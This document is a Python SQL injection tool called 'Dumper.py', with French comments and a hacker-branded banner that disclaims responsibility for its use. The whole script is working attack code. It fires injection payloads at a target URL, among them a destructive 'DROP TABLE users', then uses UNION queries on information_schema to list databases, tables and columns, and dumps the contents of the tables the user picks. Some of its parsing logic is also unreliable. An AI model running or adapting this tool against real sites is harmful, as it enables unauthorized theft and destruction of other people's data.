import requests
import argparse
import os
import sys
import time

os.system('clear')
class bcolors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'

                 # banniere d annimation
banner = {'''  
          
          #Author  : Hackfut
          #Contact : t.me/HackfutSec
          #License : MIT  
          [Warning] I am not responsible for the way you will use this program [Warning]   
          ________                                            
          \______ \  __ __  _____ ______   ___________  ______
           |    |  \|  |  \/     \\____ \_/ __ \_  __ \/  ___/
           |    `   \  |  /  Y Y  \  |_> >  ___/|  | \/\___ \ 
           /_______  /____/|__|_|  /   __/ \___  >__|  /____  >
                   \/            \/|__|        \/           \/ 
          
        Usage:
              .................................................................................
               python Dumper.py https://(link.com)/news.php?id=1                              .
               python Dumper.py -u https://(link.com)/news.php?id=1                           .
               python Dumper.py -u https://(link.com)/news.php?id=1 --file payload_list.txt   .
               python Dumper.py https://(link.com)/news.php?id=1 --file payload_list.txt      .
              .................................................................................
    '''
}

for col in banner:
    print(bcolors.GREEN + col, end="")
    sys.stdout.flush()
    time.sleep(0.00005)

# Liste de payloads pour tester l'injection SQL
SQL_PAYLOADS = [
    "' OR '1'='1",  # Test de base
    "' UNION SELECT NULL, NULL -- ",  # Union-based Injection
    "' AND 1=1 -- ",  # Boolean-based
    "'; DROP TABLE users -- ",  # Injection destructive
    "' OR 'a'='a",  # Test d'OR
]

class bcolors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'

# Fonction pour tester l'injection SQL sur une URL avec des paramètres
def test_sql_injection(url, payloads):
    print(bcolors.GREEN + f"[*] Test de l'injection SQL sur {url}...\n")
    
    for payload in payloads:
        print(bcolors.YELLOW + f"[+] Envoi du payload: {payload}")
        response = requests.get(url + payload)
        
        # Si la réponse contient des erreurs liées à SQL, il est probablement vulnérable
        if "error" in response.text.lower() or "mysql" in response.text.lower() or "syntax" in response.text.lower():
            print(bcolors.RED + f"[!] Injection SQL détectée avec le payload: {payload}")
            return True
    return False

# Fonction pour extraire le nom de la base de données
def get_database_name(url):
    payload = "' UNION SELECT 1, database() -- "
    try:
        response = requests.get(url + payload)
        # Vérification du contenu de la réponse
        if "error" not in response.text.lower() and "mysql" not in response.text.lower():
            print(bcolors.GREEN + "[+] Extraction de la base de données réussie.")
            # Extraction du nom de la base de données depuis la réponse brute
            if 'database()' in response.text:
                start_index = response.text.find('database()') + len('database()') + 2  # "+ 2" pour dépasser '()' et l'espace
                end_index = response.text.find('<', start_index)  # S'arrêter avant tout tag HTML
                db_name = response.text[start_index:end_index].strip()
                return db_name
    except Exception as e:
        print(bcolors.RED + f"[!] Erreur lors de l'extraction de la base de données: {e}")
    return None

# Fonction pour récupérer les noms des tables
def get_tables(url, db_name):
    payload = f"' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema = '{db_name}' -- "
    try:
        response = requests.get(url + payload)
        # Vérification du contenu de la réponse
        if "error" not in response.text.lower() and "mysql" not in response.text.lower():
            print(bcolors.GREEN + "[+] Extraction des tables réussie.")
            # Extraction des tables depuis la réponse brute
            start_index = response.text.find('<script>alert("')  # Ajuster cette partie en fonction du site
            if start_index != -1:
                tables = response.text[start_index:].split('</script>')[0]  # Ajustez selon la structure de réponse
                return tables.split(",")  # Retourner les tables séparées par des virgules
    except Exception as e:
        print(bcolors.RED + f"[!] Erreur lors de l'extraction des tables: {e}")
    return None

# Fonction pour récupérer les colonnes d'une table spécifique
def get_columns(url, db_name, table_name):
    payload = f"' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name = '{table_name}' AND table_schema = '{db_name}' -- "
    try:
        response = requests.get(url + payload)
        # Vérification du contenu de la réponse
        if "error" not in response.text.lower() and "mysql" not in response.text.lower():
            print(bcolors.GREEN + "[+] Extraction des colonnes réussie.")
            # Extraction des colonnes depuis la réponse brute
            start_index = response.text.find('<script>alert("')  # Ajuster selon le site cible
            if start_index != -1:
                columns = response.text[start_index:].split('</script>')[0]  # Ajustez le split selon votre besoin
                return columns.split(",")  # Retourner les colonnes séparées par des virgules
    except Exception as e:
        print(bcolors.RED + f"[!] Erreur lors de l'extraction des colonnes: {e}")
    return None

# Fonction pour dumper les données d'une table
def dump_table_data(url, db_name, table_name, columns):
    # Nous allons concaténer les colonnes pour extraire les données de toutes les colonnes
    columns_str = ','.join(columns)
    payload = f"' UNION SELECT {columns_str} FROM {table_name} -- "
    
    try:
        response = requests.get(url + payload)
        
        if "error" not in response.text.lower() and "mysql" not in response.text.lower():
            print(bcolors.GREEN + "[+] Dump des données de la table réussie.")
            # Extraction des données depuis la réponse brute
            start_index = response.text.find('<script>alert("')  # Ajuster selon le site cible
            if start_index != -1:
                data = response.text[start_index:].split('</script>')[0]  # Ajustez cette partie en fonction de la réponse
                return data.split(",")  # Retourner les lignes extraites
    except Exception as e:
        print(bcolors.RED + f"[!] Erreur lors du dump des données: {e}")
    return None

# Fonction principale pour gérer les arguments et le test
def main(target_url):
    print(bcolors.GREEN + f"\n[*] Début du test d'injection SQL sur {target_url}\n")
    
    # Tester l'injection SQL sur l'URL
    if test_sql_injection(target_url, SQL_PAYLOADS):
        print(bcolors.RED + "[!] Le site semble vulnérable à l'injection SQL.")
        
        # Extraction du nom de la base de données
        db_name = get_database_name(target_url)
        if db_name:
            print(bcolors.GREEN + f"[+] Nom de la base de données: {db_name}")
            
            # Extraction des tables
            tables = get_tables(target_url, db_name)
            if tables:
                print(bcolors.GREEN + "[+] Tables dans la base de données:")
                for i, table in enumerate(tables, 1):
                    print(f" {i}. {table}")
                
                # Demander à l'utilisateur de choisir une table
                table_choice = int(input("Choisissez une table pour lister les colonnes: ").strip()) - 1
                table_to_check = tables[table_choice]
                columns = get_columns(target_url, db_name, table_to_check)
                
                if columns:
                    print(bcolors.GREEN + f"[+] Colonnes dans la table {table_to_check}:")
                    for i, column in enumerate(columns, 1):
                        print(f" {i}. {column}")
                    
                    # Demander à l'utilisateur de choisir les colonnes à dumper
                    column_choice = input("Choisissez les colonnes à dumper (ex: 1,2,3 pour toutes les colonnes): ").strip()
                    chosen_columns = [columns[int(i)-1] for i in column_choice.split(',')]
                    
                    # Dumper les données de la table
                    data = dump_table_data(target_url, db_name, table_to_check, chosen_columns)
                    if data:
                        print(bcolors.GREEN + f"[+] Dump des données:")
                        for row in data:
                            print(row)
        else:
            print(bcolors.RED + "[!] Impossible d'extraire le nom de la base de données.")
    else:
        print(bcolors.GREEN + "[+] Aucune vulnérabilité détectée.")

if __name__ == "__main__":
    # Définir les arguments de ligne de commande
    parser = argparse.ArgumentParser(description="Outil d'injection SQL pour extraire les bases de données.")
    parser.add_argument("url", help="L'URL à tester (ex: http://example.com?id=1)")
    
    # Récupérer les arguments
    args = parser.parse_args()
    
    # Vérifier que l'argument URL est bien fourni
    if args.url:
        main(args.url)  # Passer l'URL à la fonction main
    else:
        print(bcolors.RED + "Erreur: L'URL cible est requise.")
